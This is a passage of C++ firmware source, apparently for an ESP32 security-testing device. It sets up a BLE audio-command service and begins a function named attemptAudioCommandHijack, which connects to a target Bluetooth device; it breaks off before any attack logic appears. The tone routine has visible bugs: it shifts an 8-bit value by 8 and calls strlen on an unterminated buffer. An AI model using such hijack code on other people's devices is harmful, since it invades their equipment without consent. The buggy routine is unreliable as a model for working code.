#include "whisperpair_audio.h"
#include "whisperpair.h"
#include <globals.h>
#include "core/display.h"

extern int8_t showAdaptiveMessage(const char* line1, const char* btn1 = "", const char* btn2 = "", const char* btn3 = "", uint16_t color = TFT_WHITE, bool showEscHint = true);

void AudioCommandService::AudioCmdCallbacks::onWrite(NimBLECharacteristic* pCharacteristic) {
    std::string value = pCharacteristic->getValue();
    if(value.length() > 0) {
        Serial.printf("[AudioCMD] Received: %s\n", value.c_str());
    }
}

void AudioCommandService::begin() {
    if(isRunning) return;

    initBLEIfNeeded("audio_cmd");

    pServer = NimBLEDevice::createServer();
    pService = pServer->createService("19B10000-E8F2-537E-4F6C-D104768A1214");
    pAudioCmdChar = pService->createCharacteristic(
        "19B10001-E8F2-537E-4F6C-D104768A1214",
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::WRITE | NIMBLE_PROPERTY::NOTIFY
    );
    pAudioCmdChar->setCallbacks(new AudioCmdCallbacks());
    pAudioDataChar = pService->createCharacteristic(
        "19B10002-E8F2-537E-4F6C-D104768A1214",
        NIMBLE_PROPERTY::WRITE_NR | NIMBLE_PROPERTY::NOTIFY
    );
    pService->start();
    NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();
    pAdvertising->addServiceUUID(pService->getUUID());
    pAdvertising->start();
    isRunning = true;
}

void AudioCommandService::sendAudioCommand(const char* cmd) {
    if(pAudioCmdChar && isRunning) {
        pAudioCmdChar->setValue((uint8_t*)cmd, strlen(cmd));
        pAudioCmdChar->notify();
    }
}

void AudioCommandService::sendAudioTone(uint8_t frequency, uint16_t duration_ms) {
    uint8_t toneCmd[7] = {
        'T', 'O', 'N', 'E',
        (uint8_t)(frequency >> 8),
        (uint8_t)(frequency & 0xFF),
        (uint8_t)(duration_ms / 100)
    };
    sendAudioCommand((char*)toneCmd);
}

void AudioCommandService::stop() {
    if(isRunning) {
        NimBLEDevice::deinit(true);
        isRunning = false;
    }
}

bool attemptAudioCommandHijack(NimBLEAddress target) {
    tft.fillScreen(bruceConfig.bgColor);
    drawMainBorderWithTitle("AUDIO HIJACK");
    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.print("Connecting...");

    initBLEIfNeeded();

    NimBLEClient* pClient = NimBLEDevice::createClient();
    if(!pClient